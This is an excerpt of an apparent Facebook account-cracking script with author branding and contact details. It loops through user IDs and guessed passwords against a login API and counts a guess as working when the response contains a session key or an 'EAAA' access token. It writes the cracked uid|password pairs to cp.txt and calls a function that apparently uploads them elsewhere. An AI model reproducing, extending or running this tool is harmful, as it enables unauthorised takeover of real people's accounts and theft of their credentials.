...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰SAWON-HASAN")
	subprocess.check_output(["am", "start", "https://m.me/j/AbaOKkwk-0oSp3My/"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/RAK1B-KING/SAWON/blob/main/Aproved.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : SAWON ISLAM  
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : JOIN FOR MESSENGER GROUP
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : RAKIB-KING
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 01945083441
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SAWON_OLD] : %s/%s -> \033[0;92m [ R140N-OK:%s ]- \033[0;91m[R140N-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;91m[HASAN-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SAWON-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
